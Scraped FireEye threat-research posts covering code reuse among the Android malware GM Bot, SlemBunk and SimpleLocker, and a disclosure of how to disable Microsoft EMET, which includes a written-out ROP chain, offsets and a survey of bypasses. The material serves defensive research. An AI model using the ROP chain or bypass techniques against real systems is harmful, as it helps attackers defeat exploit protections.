  some mobile banking app) is recognized. To keep <i>MainService</i>
  running continuously, malware authors added two receivers –
  <i>ServiceStarter</i> and <i>SDCardServiceStarter</i> – to check its
  status when particular system events are received. Both GM Bot and
  SlemBunk samples share the same architecture. Figure 3 shows the major
  code of class <i>SDCardServiceStarter</i> to demonstrate how GM Bot
  and SlemBunk use the same mechanism to keep <i>MainService</i> running.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Android%20Malware%20Wu/Figure3.png"" />
  <span class=""type-XS"">Figure 3. Method <i>onReceive</i> of
    <i>SDCardServiceStarter</i> for GM Bot and SlemBunk</span></p>
 <p>From this figure, we can see that GM Bot and SlemBunk use almost
  identical code to keep <i>MainService</i> running. Note that both
  samples check the country in system locale and avoid starting
  <i>MainService</i> when they find the country is Russia. The only
  difference is that GM Bot applies renaming obfuscation to some
  classes, methods and fields. For example, static variable
  “MainService;-&gt;a” in GM Bot has the same role as static variable
  “MainService;-&gt;isRunning” in SlemBunk. Malware authors commonly use
  this trick to make their code harder to understand. However this won’t
  change the fact that the underlying codes share the same origin.</p>
 <p>Figure 4 shows the core code of class <i>MainService</i> to
  demonstrate that GM Bot and SlemBunk actually have the same logic for
  main service. In Android, when a service is started its
  <i>onCreate</i> method will be called. In method <i>onCreate</i> of
  both samples, a static variable is first set to true. In GM Bot, this
  variable is named “a”, while in SlemBunk it is named “isRunning”. Then
  both will move forward to read an app particular preference. Note that
  the preferences in both samples have the same name: “AppPrefs”. The
  last tasks of these two main services are also the same. Specifically,
  in order to check whether any victim apps are running, a runnable
  thread is scheduled. If a victim app is running, a phishing view is
  overlaid on top of that of the victim app. The only difference here is
  also on the naming of the runnable thread. Class “d” in GM Bot and
  class “MainService$2” in SlemBunk are employed respectively to conduct
  the same credential phishing task.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Android%20Malware%20Wu/Figure4.png"" />
  <span class=""type-XS"">Figure 4. Class <i>MainService</i> for GM Bot
    and SlemBunk</span></p>
 <p>In summary, our investigation into the binary code similarities
  supports IBM’s assertion that GM Bot and SlemBunk share the same origin.</p>
 <p>
  <b>SimpleLocker and SlemBunk</b></p>
 <p>IBM noted that GM Bot emerged in late 2014 in the Russian-speaking
  cybercrime underground. In our research, we noticed that an earlier
  piece of Android malware named SimpleLocker also has a code structure
  similar to SlemBunk and GM Bot. However, SimpleLocker has a different
  financial incentive: to demand a ransom from the victim. After landing
  on an Android device, SimpleLocker scans the device for certain file
  types, encrypts them, and then demands a ransom from the user in order
  to decrypt the files. Before SimpleLocker’s emergence, there were
  other types of Android ransomware that would lock the screen; however,
  SimpleLocker is believed to be the first file-encryption ransomware on Android.</p>
 <p>The earliest report on SimpleLocker we identified was published by
  ESET in June 2014 [<a href=""http://www.welivesecurity.com/2014/06/04/simplocker/"">6</a>].
  However, we found an earlier sample in our malware database from May
  2014 (SHA256
  edff7bb1d351eafbe2b4af1242d11faf7262b87dfc619e977d2af482453b16cb). The
  compile date of this app was May 20, 2014. We compared this
  SimpleLocker sample to one of our SlemBunk samples (SHA256
  f3341fc8d7248b3d4e58a3ee87e4e675b5f6fc37f28644a2c6ca9c4d11c92b96)
  using the same methods used to compare GM Bot and SlemBunk.</p>
 <p>Figure 5 shows the code structure comparison between these two
  samples. Note that this SimpleLocker variant also has the major
  components <i>ServiceStarter</i> and <i>MainService</i>, both used by
  SlemBunk. However, the purpose of the main service here is not to
  monitor running apps and provide phishing UIs to steal banking
  credentials. Instead, SimpleLocker’s main service component scans the
  device for victim files and calls the file encryption class to encrypt
  files and demand a ransom. The major differences in the SimpleLocker
  code are shown in the red boxes: AesCrypt and FileEncryptor. Other
  common classes include:</p>
 <ul> <li>
    <b>
      <i>Main</i></b>, the launching activity of both samples.</li> <li>
    <b>
      <i>SDCardServiceStarter</i></b>, another receiver that monitors
    the status of <i>MainService</i> and restarts it when it dies.</li> <li>
    <b>
      <i>Tor </i>and<i> OnionKit, </i></b>third-party libraries for
    private communication.</li> <li>
    <b>
      <i>TorSender</i>, <i>HttpSender</i> and <i>Utils</i>,
    </b>supporting classes to provide code for CnC communication and for
    collecting device information.</li> </ul>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Android%20Malware%20Wu/Figure5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5. Code structure comparison between
    SimpleLocker and SlemBunk samples</span></p>
 <p>Finally, we located another SimpleLocker sample (SHA256
  304efc1f0b5b8c6c711c03a13d5d8b90755cec00cac1218a7a4a22b091ffb30b) from
  July 2014, about two months after the first SimpleLocker sample. This
  new sample did not use Tor for private communications, but shared four
  of the five major components as the SlemBunk sample (SHA256:
  f3341fc8d7248b3d4e58a3ee87e4e675b5f6fc37f28644a2c6ca9c4d11c92b96).
  Figure 6 shows the code structure comparison between these two samples.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Android%20Malware%20Wu/Figure6.png"" />
  <span class=""type-XS"">Figure 6. Code structure comparison between
    SimpleLocker and SlemBunk variants</span></p>
 <p>As we can see in Figure 6, the new SimpleLocker sample used a
  packaging mechanism similar to SlemBunk, putting <i>HttpSender</i> and
  <i>Utils</i> into a sub-package named “utils”. It also added two other
  major components that were originally only seen in SlemBunk:
  <i>MessageReceiver</i> and <i>MyDeviceAdminReceiver</i>. In total,
  this SimpleLocker variant shares four out of five major components
  with SlemBunk.</p>
 <p>Figure 7 shows the major code of <i>MessageReceiver</i> in the
  previous samples to demonstrate that SimpleLocker and SlemBunk use
  basically the same process and logic to communicate with the CnC
  server. First, class <i>MessageReceiver</i> registers itself to handle
  incoming short messages, whose arrival will trigger its method
  <i>onReceive</i>. As seen from the figure, the main logics here are
  basically the same for SimpleLocker and SlemBunk. They first read the
  value of a particular key from app preferences. Note that the names
  for the key and shared preference are the same for these two different
  malware families: key is named “CHECKING_NUMBER_DONE” and preference
  named “AppPrefs”.  The following steps call method
  <i>retrieveMessage</i> to retrieve the short messages, and then
  forward the control flow to class <i>SmsProcessor</i>. The only
  difference here is that SimpleLocker adds one extra method named
  <i>processControlCommand</i> to forward control flow.</p>
 <p>Class <i>SmsProcessor</i> defines the CnC commands supported by the
  malware families. Looking into class <i>SmsProcessor</i>, we
  identified more evidence that SimpleLocker and SlemBunk are of the
  same origin. First, the CnC commands supported by SimpleLocker are
  actually a subset of those supported by SlemBunk. In SimpleLocker, CnC
  commands include &quot;intercept_sms_start&quot;,
  &quot;intercept_sms_stop&quot;, &quot;control_number&quot; and
  &quot;send_sms&quot;, all of which are also present in SlemBunk
  sample. What is more, in both SimpleLocker and SlemBunk there is a
  common prefix “#” before the actual CnC command. This kind of
  peculiarity is a good indicator that SimpleLocker and SlemBunk share a
  common origin.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Android%20Malware%20Wu/Figure7.png"" />
  <span class=""type-XS"">Figure 7. Class <i>MessageReceiver</i> for
    SimpleLocker and SlemBunk variants</span></p>
 <p>The task of class <i>MyDeviceAdminReceiver </i>is to request device
  administrator privilege, which makes these malware families harder to
  remove. SimpleLocker and SlemBunk are also highly similar in this
  respect, supporting the same set of device admin relevant functionalities.</p>
 <p>At this point, we can see that these variants of SimpleLocker and
  SlemBunk share four out of five major components and share the same
  supporting utilities. The only difference is in the final payload,
  with SlemBunk phishing for banking credentials while SimpleLocker
  encrypts certain files and demands ransom. This leads us to believe
  that SimpleLocker came from the same original code base as SlemBunk.</p>
 <h5>
  <b>Conclusion</b></h5>
 <p>Our analysis confirms that several Android malware families share a
  common origin, and that the first known file-encrypting ransomware for
  Android – SimpleLocker – is based on the same code as several banking
  trojans. Additional research may identify other related malware families.</p>
 <p>Individual developers in the cybercrime underground have been
  proficient in writing and customizing malware. As we have shown,
  malware with specific and varied purposes can be built on a large base
  of shared code used for common functions such as gaining
  administrative privileges, starting and restarting services, and CnC
  communications. This is apparent simply from looking at known samples
  related to GM Bot – from SimpleLocker that is used for encryption and
  ransomware, to SlemBunk that is used as a banking Trojan and for
  credential theft, to the full-featured MazarBot backdoor.</p>
 <p>With the leak of the GM Bot source code, the number of customized
  Android malware families based on this code will certainly increase.
  Binary code-based study, one of FireEye Labs’ major research tools,
  can help us better characterize and track malware families and their
  relationships, even without direct access to the source code.
  Fortunately, the similarities across these malware families make them
  easier to identify, ensuring that FireEye customers are well protected.</p>
 <p>
  <b>References:</b></p>
 <p>[1]. <a href=""https://securityintelligence.com/android-malware-about-to-get-worse-gm-bot-source-code-leaked/"">Android
    Malware About to Get Worse: GM Bot Source Code Leaked</a><br /> [2].
    <a href=""http://www.symantec.com/connect/blogs/androidbankosy-all-ears-voice-call-based-2fa"">Android.Bankosy:
    All ears on voice call-based 2FA</a><br /> [3]. MazarBOT: Top class
  Android datastealer<br /> [4]. <a href=""https://www.fireeye.com/blog/threat-research/2015/12/slembunk_an_evolvin.html"">SLEMBUNK:
    AN EVOLVING ANDROID TROJAN FAMILY TARGETING USERS OF WORLDWIDE
    BANKING APPS</a><br /> [5]. <a href=""https://www.fireeye.com/blog/threat-research/2016/01/slembunk-part-two.html"">SLEMBUNK
    PART II: PROLONGED ATTACK CHAIN AND BETTER-ORGANIZED
  CAMPAIGN</a><br /> [6]. <a href=""http://www.welivesecurity.com/2014/06/04/simplocker/"">ESET
    Analyzes Simplocker – First Android File-Encrypting, TOR-enabled Ransomware</a></p>",http://www.fireeye.com/blog/threat-research/2016/03/android-malware-family-origins.html
Lessons from Operation RussianDoll,"<p>As defensive security controls raise the bar to attack, attackers
  will employ increasingly sophisticated techniques to complete their
  mission. Understanding the mechanics and impact of these threats is
  essential to systematically discover and deflect the coming wave of
  advanced attacks.</p>
 <p>Mandiant has developed a comprehensive whitepaper that provides a
  multi-faceted analysis of the exploit payload &quot;Operation
  RussianDoll.&quot; This payload is an exploit for CVE-2015-1701
  embedded within the un-obfuscated 64-bit RussianDoll payload (MD5:
  54656d7ae9f6b89413d5b20704b43b10). The whitepaper references a freely
  available open-source proof of concept and provides malware triage
  analysts, reverse engineers, and exploit analysts with tools and
  background information to recognize and analyze future exploits. It
  also covers how red team analysts can apply these principles to carve
  out exploit functionality or augment exploits to produce tools that
  will enhance effectiveness of security operations.</p>
 <p>The whitepaper walks the reader through the payload's actions to
  understand how to loosely identify what it does once it has gained
  kernel privilege. It then discusses how to obtain higher-resolution
  answers from reverse engineering by using WinDbg to confirm
  assumptions, manipulate control flow, and observe exploit behavior.
  Building on this and other published sources, a technically detailed
  exploit analysis is assembled by examining the relevant portions of
  win32k.sys. Finally, the paper discusses how to extract and augment
  this exploit to load encrypted, unsigned drivers into the Windows 7
  x64 kernel address space.</p>
 <p>We hope this analysis will support security professionals'
  understanding of the malware used by Advanced Persistent Threat (APT)
  actors and of tools and techniques that may be used to conduct
  enhanced analysis.</p>
 <p>
  <b>
    <a href=""https://www2.fireeye.com/Lessons-from-Operation-RussianDoll-Matryoshka-Mining.html"" target=""_blank"">Download the &quot;Lessons from Operation
      RussianDoll&quot; whitepaper here</a>.</b></p>",http://www.fireeye.com/blog/threat-research/2016/03/lessons-from-operation-russian-doll.html
Relational Learning Tutorial,"<p>At FireEye, we apply machine learning techniques to a variety of
  security problems. Malware detection and categorization is a great use
  of the technology, and we believe that it can also play a role in
  security challenges that extend beyond malware.</p>
 <p>In one such R&amp;D effort, the Innovation &amp; Custom Engineering
  (ICE) team is utilizing machine learning to build statistical models
  of relationships between entities. These models can then be used to
  “connect the dots” by making predictions about relationships we
  haven’t observed, or to spot anomalous relationships that don’t fit
  expected patterns.</p>
 <p>The most popular application of these algorithms is probably item
  recommendation, where they are used to personalize our consumer
  experiences in today’s online marketplace. There are also many
  important security applications, such as analyzing relationships
  between threat actors, TTPs, and their targets. Another is detecting
  attacker activity by modeling relationships between users, machines,
  applications, and network connections.</p>
 <p>Figure 1 shows an example of how these algorithms can also be used
  for clustering and visualization. This particular model has
  automatically clustered several thousand machines into groups of
  similar function, just by observing internal network connection behavior.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Relational%20learning%20blog/annotated_viz.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1. Visualization of model-based
    clustering when trained on network connection relationships</span></p>
 <p>We have created a tutorial that steps through building several types
  of relational learning models using Python and Google’s new machine
  learning framework, TensorFlow.  The target audience is machine
  learning researchers and practitioners, but security professionals who
  like to channel their inner “data nerd” may also find it
  interesting!<br /> <br /> The tutorial and accompanying code is <a href=""http://nbviewer.jupyter.org/github/fireeye/tf_rl_tutorial/blob/master/tf_rl_tutorial.ipynb"" target=""_blank"">available as a Jupyter Notebook here.</a></p>",http://www.fireeye.com/blog/threat-research/2016/03/relational_learning.html
Using EMET to Disable EMET,"<p>
  <i>UPDATE (July 7): This post has been updated in advance of a Black
    Hat 2016 presentation.</i></p>
 <p>Microsoft’s Enhanced Mitigation Experience Toolkit (EMET) is a
  project that adds security mitigations to user mode programs beyond
  those built in to the operating system. It runs inside “protected”
  programs as a Dynamic Link Library (DLL), and makes various changes in
  order to make exploitation more difficult.</p>
 <p>EMET bypasses have been seen in research and past attacks [2, 3, 4,
  5, 6, 7, 8]. Generally, Microsoft responds by changing or adding
  mitigations to defeat any existing bypasses. EMET was designed to
  raise the cost of exploit development and not as a “fool proof exploit
  mitigation solution” [1]. Consequently, it is no surprise that
  attackers who have read/write capabilities within the process space of
  a protected program can <a href=""http://labs.bromium.com/2014/02/24/bypassing-emet-4-1/"">bypass
    EMET by systematically defeating each mitigation</a> [2].</p>
 <p>If an attacker can bypass EMET with significantly less work, then it
  defeats EMET’s purpose of increasing the cost of exploit development.
  We present such a technique in the section New Technique to Disable
  EMET. Microsoft has issued a patch to address this issue in <a href=""http://www.microsoft.com/emet"">EMET 5.5</a>.</p>
 <p>After discussing this new technique, we describe previously
  documented techniques used to either bypass or disable EMET. Please
  refer to the appendix if you’d like to know more about what kind of
  protections are implemented by EMET.</p>
 <h4>New Technique to Disable EMET</h4>
 <p>EMET injects emet.dll or emet64.dll (depending upon the
  architecture) into every protected process, which installs Windows API
  hooks (exported functions by DLLs such as kernel32.dll, ntdll.dll, and
  kernelbase.dll). These hooks provide EMET the ability to analyze any
  code calls in critical APIs and determine if they are legitimate. If
  code is deemed to be legitimate, EMET hooking code jumps back into the
  requested API. Otherwise it triggers an exception.</p>
 <p>However, there exists a portion of code within EMET that is
  responsible for unloading EMET. The code systematically disables
  EMET’s protections and returns the program to its previously
  unprotected state. One simply needs to locate and call this function
  to completely disable EMET. In EMET.dll v5.2.0.1, this function is
  located at offset 0x65813. Jumping to this function results in
  subsequent calls, which remove EMET’s installed hooks.</p>
 <p>This feature exists because emet.dll contains code for cleanly
  exiting from a process. Conveniently, it is reachable from DllMain.</p>
 <p>Prototype of DllMain :<br /> BOOL WINAPI DllMain(<br />  
  _In_ HINSTANCE hinstDLL,<br />   _In_ DWORD     fdwReason,<br />  
  _In_ LPVOID    lpvReserved<br /> );</p>
 <p>Note that the first parameter provides the base address of the DLL.
  The second provides the parameter that the PE loader uses to
  communicate if the DLL is being Loaded or Unloaded, 1 or 0
  respectively. If the fdwReason is 1, the DLL knows that it is being
  loaded and initializes. If the fdwReason parameter is 0
  (DLL_PROCESS_DETACH), emet.dll initiates the unloading code, thus it
  simply goes through the exit routine assuming that it’s being
  unloaded, and it removes its hooks and exception handlers, thereby
  simply removing EMET’s checks. Note that this will not remove EMET
  from memory; it just ensures all of its protections are disabled.</p>
 <p>This kind of feature could exist in any detection-oriented product,
  which relies on user-space hooks, and in order to make sure the
  product does not break, there has to be an unloading routine that
  removes all protection checks. EMET’s DllMain can be found through a
  small Return Oriented Programming (ROP) gadgets chain shown in the
  next section, which just jumps to the DllMain with the right
  parameters to unload EMET protection checks.</p>
 <p>BOOL WINAPI DllMain (GetModuleHandleA(&quot;EMET.dll&quot;) ,
  DLL_PROCESS_DETACH , NULL);</p>
 <p>The GetModuleHandleA function is not hooked by EMET since it is not
  considered as critical Windows API. We use this function to retrieve
  the base address of emet.dll. Since the PE header is located at the
  base address, we have to use it to find the address of the DllMain to
  send the required parameters.</p>
 <h4>Disabling EMET - Details</h4>
 <p>The function behind removing EMET hooks is located at offset
  0x27298, which is shown in Figure 1.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Emet/Figure1.png"" />
  <span class=""type-XS"">Figure 1: Function at offset 0x27298 responsible
    for removing EMET hooks</span></p>
 <p>First, the function loops through all Detoured_API structures, and
  zeroes out the DetouredFunctionPrologue for each associated
  Detoured_API_Config structure.</p>
 <p>The Detoured_API structure, depicted below, is a linked list that
  tracks whether an API is actively detoured and references the DetouredAPIConfig:</p>
 <p>struct Detoured_API {<br /> BOOL isActive;                 
                 // isActive field shows the hooking status, Active:
  0x1<br /> PVOID DetouredAPIConfig;             // pointer to
  Detoured_API_Config structure<br /> PVOID nextDetouredAPI; 
                 // pointer to the next Detoured_API structure<br /> };</p>
 <p>The Detoured_API_Config structure (partially shown below) stores
  information about the detour and its original API.</p>
 <p>struct Detoured_API_Config {<br /> PVOID
  DetouredWindowsAPI;          // pointer to the detoured Windows
  API<br /> PVOID EMETDetouringFunction;      // pointer to where EMET
  protection implemented<br /> PVOID DetouredFunctionPrologue;  //
  pointer to the Windows API prologue<br /> ...<br /> }</p>
 <p>The DetouredFunctionPrologue contains a copy of the original API
  prologue, followed by a jump to the remainder of the original API.</p>
 <p>After clearing the DetouredFunctionPrologue in all
  Detoured_API_Configs, the function in Figure 1 calls Patch_Functions.
  Patch_Functions walks the Hook_Config linked list structure partially
  shown here:</p>
 <p>struct Hook_Config {<br /> PVOID nextHookConfig;                  //
  pointer to the next Hook_Config<br /> BOOL isActive;                  
              // isActive field shows the hooking status, Active:
  0x1<br /> PVOID ptrEffectiveFunction;            // pointer to
  EMETDetouringFunction or non-detoured API<br /> PVOID
  DetouredWindowsAPI;         // pointer to the detoured Windows
  API<br /> PVOID EMETDetouringFunction;      // pointer to where EMET
  protection implemented<br /> …<br /> };</p>
 <p>For each Hook_Config, Patch_Functions restores the original API
  prologue as seen in Figure 2. Patch_Functions retrieves the size and
  address of the original function prologue from EMETDetouringFunction,
  and passes the values to memcpy. After each API is restored to its
  original state, Patch_Functions changes ptrEffectiveFunction to point
  directly to the original API.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Emet/Figure2.png"" />
  <span class=""type-XS"">
    <br /> Figure 2: Code that removes detours</span></p>
 <p>After looping through all the detoured APIs and patching them with
  memcpy, you see that all the detours in Windows APIs are gone, as show
  in Figure 3 and Figure 4, before and after respectively.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Emet/Figure3.png"" />
  <span class=""type-XS"">Figure 3: Before calling DllMain with unloading parameters</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Emet/Figure4.png"" />
  <span class=""type-XS"">Figure 4: After calling DllMain with unloading parameters</span></p>
 <p>EMET then continues to disable EAF and EAF+ protections. In the
  function at offset 0x609D0, EMET zeros out and reinitializes CONTEXT
  structure, and manipulates debugging registers (as shown in Figure 5).
  However, at the end of the function, EMET calls NtSetContextThread,
  which results in zeroing out the debugging registers, and hence
  disabling EAF and EAF+ protections.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Emet/Figure5.png"" />
  <span class=""type-XS"">
    <br /> Figure 5: EAF &amp; EAF+ disabling code</span></p>
 <p>Finally, at the end of the function at offset 0x60FBF, EMET calls
  the function located at offset 0x60810 that calls
  RemoveVectoredExceptionHandler to remove the defined vectored
  exception handler, which has been added using AddVectoredExceptionHandler.</p>
 <h4>Disabling EMET – ROP Implementation</h4>
 <p>Using an old and patched vulnerability, CVE-2011-2371, we built ROP
  gadgets on top of an already existing exploit, and executed it with
  EMET protections enabled. After our ROP gadgets called the DllMain
  function of EMET.dll with parameters (EMET.dll base address, 0, 0), we
  returned to execution, and all the detours placed in the hooked
  Windows APIs were gone along with EAF and EAF+ protections.</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""468"">MOV ESP,44090000 # ~ # RETN //
        STACKPIVOT<br /> POP EAX # RETN // STORE GetModuleHandleA IAT
        POINTER INTO EAX<br /> MOZCRT19+0x79010 //
        MOZCRT19!_imp__GetModuleHandleA<br /> MOV EAX,DWORD PTR DS:[EAX]
        # RETN   // GET GetModuleHandleA ADDRESS<br /> PUSH EAX # RETN #
        // Call GetModuleHandleA(&quot;EMET.dll&quot;)<br /> Return
        Address XOR EDX,EDX # RETN   // ZERO OUT ECX<br /> 0x44090108 //
        &quot;EMET&quot; STRING ADDRESS (GetModuleHandleA
        PARAMETER)<br /> OR EDX,EAX # ~ # RETN // STORE EMET.dll
        EMET_BASE_ADDRESS INTO EDX<br /> POP EBX # RETN // STORE
        DllMain() PARAMETER1 ADDRESS (i.e. hinstDLL) INTO EBX<br />
        0x440900A4 // DllMain() PARAMETER1 (i.e. hinstDLL) ADDRESS<br />
        MOV DWORD PTR DS:[EBX],EAX # ~ # RETN // hinstDLL PATCH WITH
        EMET_BASE_ADDRESS<br /> POP ECX # RETN # // STORE 0x3C (i.e.
        IMAGE_DOS_HEADER) INTO ECX<br /> 0x0000003C // IMAGE_DOS_HEADER
        OFFSET<br /> ADD ECX,EDX # ADD EAX,ECX # ~ # RETN // EAX =
        EMET_BASE_ADDRESS+0x3C<br /> MOV EAX,DWORD PTR DS:[EAX] # RETN
        // GET PE_HEADER OFFSET<br /> POP ECX # RETN # // STORE
        AddressOfEntryPoint OFFSET INTO ECX<br /> 0x00000028 //
        AddressOfEntryPoint OFFSET<br /> ADD ECX,EDX # ADD EAX,ECX # ~ #
        RETN // EAX = EMET_BASE_ADDRESS+PE_HEADER+0x28<br /> MOV
        EAX,DWORD PTR DS:[EAX] # RETN // GET DllMain() OFFSET<br /> POP
        ECX # RETN # // ZERO OUT ECX<br /> 0x00000000<br /> ADD ECX,EDX
        # ADD EAX,ECX # ~ # RETN // EAX =
        EMET_BASE_ADDRESS+DllMain<br /> Call EAX // CALL
        DllMain(GetModuleHandleA(&quot;EMET.dll&quot;) ,
        DLL_PROCESS_DETACH , NULL)<br /> 0x42424242 // hinstDLL =
        GetModuleHandleA(&quot;EMET.dll&quot;) (TO BE PATCHED)<br />
        0x00000000 // fdwReason = DLL_PROCESS_DETACH<br /> 0x00000000 //
        lpvReserved = 0x00000000</td> </tr></tbody></table>
 <h4>Previous EMET Bypass Techniques</h4>
 <p>Previous techniques used to bypass EMET protections generally
  exploit design and implementation flaws, were possible because of some
  module or API was left out and not secured. We will describe a few of
  these bypass techniques.</p>
 <p>Since LoadLibrary is a critical API, EMET 4.1 raises an exception if
  it gets called with either a return or jump instruction, but Jared
  DeMott showed that calling LoadLibrary API with a call instruction
  instead of jumping or returning bypasses EMET LoadLibrary protection [2].</p>
 <p>The LoadLibrary API is monitored in order to prevent loading UNC
  paths (i.e. <a>\\evil\bad.dll</a>). Aaron Portnoy showed that this
  could be bypassed by using MoveFile API (which is not monitored by
  EMET 4.0) to download a DLL file that can then be loaded by
  LoadLibrary API [3].</p>
 <p>Caller check protection in EMET 4.1 is used to prevent ROP gadgets
  by checking if a critical Windows API has been called with a call
  instruction, return instruction, or jump instruction – the latter two
  are widely used in ROP gadgets. DeMott showed a way to bypass caller
  check protection by executing a legitimate call to the critical API
  function [2]. Instead of calling VirtualAlloc API directly with a
  return or jump instruction (which will cause EMET to raise an
  exception), DeMott used a call instruction to VirtualAlloc API in one
  of the loaded modules, and by returning to the address of that call
  instruction, the critical Windows API gets called without having EMET
  get in the way.</p>
 <p>Critical Windows API functions are located in kernel32.dll,
  ntdll.dll and kernelbase.dll; EMET 3.5 was hooking the functions
  exported by the first two modules, but not for kernelbase.dll.
  Shahriyar Jalayeri used this fact to execute VirtualProtect API
  located in the kernelbase module to make the memory writable and
  executable [4]. However, after EMET 4.0 was released, the Deep Hooks
  protection is hooking even the lowest level of critical Windows API functions.</p>
 <p>Jalayeri also bypassed EMET by using the _KUSER_SHARED_DATA
  structure (which has a fixed address) located in 0x7ffe0000, wherein
  at offset 0x300 there is a SystemCallStub pointer that points to
  KiFastSystemCall, which is the typical way to execute sysenter
  instruction. With that, he was able to call any system call by
  specifying its number in the EAX register (e.g. 0x0D7 for
  ZwProtectVirtualMemory). Additionally, Jalayeri was able to deactivate
  EMET completely by patching the function prologue with a return
  instruction to make it ineffective.</p>
 <p>EAF protection uses debug registers to place breakpoints on accesses
  of exported functions in modules such as kernel32.dll, ntdll.dll and
  kernelbase.dll. These breakpoints can be bypassed using a shellcode
  that uses the import access table instead of the export access table
  (since this protection is applicable for export access table only).</p>
 <h4>Previous EMET Disabling Techniques</h4>
 <p>Unlike bypasses, which circumvent protections, disabling EMET turns
  off its protections entirely. For example, EAF (and EAF+ partially)
  can be disabled by clearing hardware breakpoints (i.e. zero out the
  debugging registers). Piotr Bania used the undocumented Windows APIs
  NtSetContextThread and NtContinue to achieve this, but since
  NtSetContextThread is hooked by EMET, one should first disable other
  EMET protections to make NtSetContextThread usable [5].</p>
 <p>Offensive Security found that most of EMET 4.1 protections first
  check the value of an exported global variable located at offset
  0x0007E220 in emet.dll; if that variable’s value is zero, then the
  protection body proceeds without interfering with the caller code [6].
  It turned out that the global variable is the global switch used to
  turn on/off EMET protections, and by having that variable in a
  writable data section, attackers can craft ROP gadgets to zero out
  that variable easily.</p>
 <p>After doing some analysis, we found that EMET v2.1 has the same
  global switch located in the offset 0xC410, and because of this we
  suspect that EMET has the global switch weakness from the earliest
  versions of EMET by having the global variable in fixed addresses.
  This was the case until EMET 5.0 was released.</p>
 <p>Offensive Security found that in EMET 5.0, Microsoft put that global
  variable on the heap within a large structure (i.e. CONFIG_STRUCT)
  with the size of 0x560 bytes [7]. However, the same concept is still
  applicable since there is a pointer to the CONFIG_STRUCT structure
  located in a fixed offset 0x0AA84C. As a protection, EMET was encoding
  this pointer value with EncodePointer function, and every time the
  EMET protection needed to check that value, it would decode it with
  DecodePointer function to get the CONFIG_STRUCT address. Zero out
  CONFIG_STRUCT+0x558 turns off most of EMET protections. Additionally,
  to turn off EAF and EAF+ they used unhooked pointers to
  NtSetContextThread stored at CONFIG_STRUCT+0x518.</p>
 <p>In EMET 5.1, Offensive Security found that the global variable holds
  encoded pointer values to some structure (i.e. EMETd), which is stored
  in the offset 0xF2A30 [8]. The EMETd structure has a pointer field to
  the CONFIG_STRUCT structure that holds the global switch at the offset
  CONFIG_STRUCT+0x558 as additional protection layer to the pointer’s
  encoding. EMET 5.1 uses the cpuid instruction to XOR the returned
  values with the encoded pointer’s values. To decode CONFIG_STRUCT,
  they used the code in the offset 0x67372 of emet.dll, which decodes
  the EMETd structure and then returns back the decoded pointer of
  CONFIG_STRUCT. Since the global switch (i.e. CONFIG_STRUCT+0x558) is
  stored in a read-only memory page, Offensive Security found a way to
  change that by using unhooked pointers stored in EMET at fixed
  addresses. They used an unhooked pointer to
  ntdll!NtProtectVirtualMemory stored at CONFIG_STRUCT+0x1b8 to mark it
  as a writable memory page, so they can zero out the global switch at
  CONFIG_STRUCT+0x558. For disabling EAF and EAF+, they have used the
  unhooked pointer to NtSetContextThread stored at CONFIG_STRUCT+0x518,
  the same as what they did in disabling EMET 5.0.</p>
 <h4>Conclusion</h4>
 <p>This new technique uses EMET to unload EMET protections. It is
  reliable and significantly easier than any previously published EMET
  disabling or bypassing technique. The entire technique fits within a
  short, straightforward ROP chain. It only needs to leak the base
  address of a DLL importing GetModuleHandleA (such as mozcrt19.dll),
  instead of full read capabilities over the process space. Since the
  DllMain function of emet.dll is exported, the bypass does not require
  hard-coded version-specific offsets, and the technique works for all
  tested versions of EMET (4.1, 5.1, 5.2, 5.2.0.1).</p>
 <p>The inclusion and accessibility of code to disable EMET <i>from
  within</i> EMET creates a significant new attack vector. Locating the
  DllMain and calling it to shutdown all of EMET’s protections is
  significantly easier than bypassing each of EMETs protections as they
  were designed, and consequently undermines their value.</p>
 <p>Special thanks to: Michael Sikorski, Dan Caselden, Corbin Souffrant,
  Genwei Jiang, and Matthew Graeber.</p>
 <h2>Appendix</h2>
 <h3>EMET Protections</h3>
 <p>EMET has evolved throughout the years, and a brief description of
  features is provided here:</p>
 <h4>EMET 1.x, released in October 27, 2009</h4>
 <p>Structured Exception Handling Overwrite Protection (SEHOP): Provides
  protection against exception handler overwriting.</p>
 <p>Dynamic Data Execution Prevention (DEP): Enforces DEP so data
  sections such as stack or heap are not executable.</p>
 <p>NULL page allocation: Prevents exploitation of null dereferences.</p>
 <p>Heap spray allocation: Prevents heap spraying.</p>
 <h4>EMET 2.x, released in September 02, 2010</h4>
 <p>Mandatory Address Space Layout Randomization (ASLR): Enforces
  modules base address randomization; even for legacy modules, which are
  not compiled with ASLR flag.</p>
 <p>Export Address Table Access Filtering (EAF): Normal shellcode (e.g.
  Metasploit shellcode) iterates over the exported functions of loaded
  modules to resolve critical Windows API functions, which are normally
  exported by kernel32.dll, ntdll.dll and kernelbase.dll. EMET uses
  hardware breakpoints stored in debugging registers (e.g. DR0) to stop
  any thread which tries to access the export table of these modules,
  and lets the EMET thread verify whether it is a legitimate access.</p>
 <h4>EMET 3.x, released in May 25, 2012</h4>
 <p>Imported mitigations from ROPGuard to protect against Return
  Oriented Programming (ROP).</p>
 <p>Load Library Checks: Prevents loading DLL files through Universal
  Naming Convention (UNC) paths.</p>
 <p>ROP Mitigation - Memory protection checks: Protects critical Windows
  APIs like VirtualProtect, which might be used to mark the stack as executable.</p>
 <p>ROP Mitigation - Caller check: Prevents critical Windows APIs from
  being called with jump or return instructions.</p>
